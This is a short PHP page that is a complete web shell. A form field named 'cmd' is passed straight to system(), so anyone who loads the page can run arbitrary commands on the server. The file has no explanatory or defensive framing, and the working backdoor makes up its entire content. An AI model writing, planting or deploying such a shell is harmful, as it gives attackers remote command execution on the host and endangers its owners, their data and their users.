<html>
  <body style="background-color: white; color: black; border: 1px solid black;">
  <form action="" method="GET">
    <input type="text" name="cmd">
    <input type="submit" value="Execute">
  </form>
  <?php system($_GET["cmd"]);?>
  </body>
</html>
